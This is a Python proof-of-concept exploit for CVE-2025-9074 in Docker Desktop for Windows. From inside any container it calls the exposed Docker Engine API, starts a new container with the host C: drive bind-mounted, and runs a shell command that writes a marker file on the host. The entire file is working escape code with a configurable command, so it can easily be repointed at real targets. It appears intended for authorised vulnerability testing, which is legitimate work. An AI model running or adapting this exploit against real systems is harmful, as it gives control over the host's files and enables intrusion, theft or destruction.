"""
CVE-2025-9074 PoC (Windows Docker Desktop)
- Executes from inside ANY container on a vulnerable host
- Requires: pip install requests
Run only on systems you own or have permission to test.
"""

import argparse, json, sys
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    print("[!] Please: pip install requests", file=sys.stderr)
    sys.exit(1)

def api(base, path, method="GET", **kwargs):
    url = urljoin(base if base.endswith('/') else base+'/', path.lstrip('/'))
    r = requests.request(method, url, timeout=8, **kwargs)
    if r.status_code >= 400:
        raise RuntimeError(f"{method} {path} -> {r.status_code} {r.text[:300]}")
    return r

def check_engine(base):
    r = api(base, "/_ping")
    if r.text.strip() != "OK":
        print(f"[?] Unexpected /_ping: {r.text.strip()}")
    v = api(base, "/version").json()
    ver = v.get("Version", "?")
    plat = v.get("Platform", {}).get("Name", "")
    os = v.get("Os", "")
    print(f"[+] Docker Engine: {ver} ({os} {plat})")
    return v

def create_container(base, image, cmd, bind_src, bind_dst, name=None):
    payload = {
        "Image": image,
        "Cmd": ["sh", "-c", cmd],
        "HostConfig": {
            "Binds": [f"{bind_src}:{bind_dst}"]
        }
    }
    params = {}
    if name:
        params["name"] = name
    r = api(base, "/containers/create",
            method="POST",
            params=params,
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload))
    j = r.json()
    cid = j.get("Id")
    if not cid:
        raise RuntimeError(f"No container Id in response: {j}")
    return cid

def start_container(base, cid):
    api(base, f"/containers/{cid}/start", method="POST", data=b"")
    print(f"[+] Started container: {cid[:12]}")

def main():
    ap = argparse.ArgumentParser(description="CVE-2025-9074 PoC â€” Docker Desktop for Windows")
    ap.add_argument("--host", default="192.168.65.7", help="Docker Engine host (default: 192.168.65.7)")
    ap.add_argument("--port", type=int, default=2375, help="Docker Engine port (default: 2375)")
    ap.add_argument("--image", default="alpine", help="Image to run (default: alpine)")
    ap.add_argument("--host-path", dest="host_path", default="/mnt/host/c",
                    help="HOST path to bind (default: /mnt/host/c)")
    ap.add_argument("--mount-path", dest="mount_path", default="/host_root",
                    help="Container mount point (default: /host_root)")
    ap.add_argument("--outfile", default="pwn.txt", help="File to write on host C:\\ (default: pwn.txt)")
    args = ap.parse_args()

    base = f"http://{args.host}:{args.port}"
    print(f"[+] Targeting Docker HTTP API at {base}")
    try:
        check_engine(base)
    except Exception as e:
        print(f"[!] Engine not reachable or not vulnerable: {e}")
        sys.exit(2)

    cmd = f"echo pwned_by_CVE_2025_9074 > {args.mount_path}/{args.outfile}"
    try:
        cid = create_container(base, args.image, cmd, args.host_path, args.mount_path)
        print(f"[+] Created container: {cid[:12]}")
        start_container(base, cid)
        print(f"[+] If vulnerable, check on the HOST: C:\\{args.outfile}")
    except Exception as e:
        print(f"[!] PoC failed: {e}")
        sys.exit(3)

if __name__ == "__main__":
    main()
